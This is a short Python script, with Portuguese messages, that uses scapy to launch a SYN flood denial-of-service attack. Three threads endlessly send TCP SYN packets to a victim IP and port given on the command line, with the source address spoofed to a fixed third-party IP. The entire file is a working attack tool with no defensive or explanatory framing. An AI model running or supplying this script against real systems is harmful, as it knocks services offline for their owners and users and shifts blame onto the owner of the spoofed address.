from scapy.all import *
import sys
import threading
import random


def Dos(ip,port):
	while (ip != None and port != None):
		n = random.randint(0,65535)
		window = random.randint(0,65535)
		respos = sr(IP(dst=ip,src="167.136.200.7")/TCP(flags='S',dport=port,seq=n,), timeout=0.1, verbose=False)
		print(f'Realizando ataque Dos no {ip} na porta {port}')

if (len(sys.argv) <=2):
	print('HELP:\r\nDos.py <ip da vitima> <porta>')
else:
	ip = sys.argv[1]
	port = int(sys.argv[2])
	Dos1 = threading.Thread(target=Dos, args=[ip,port])
	Dos2 = threading.Thread(target=Dos, args=[ip,port])
	Dos3 = threading.Thread(target=Dos, args=[ip,port])
	Dos1.start()
	Dos2.start()
	Dos3.start()
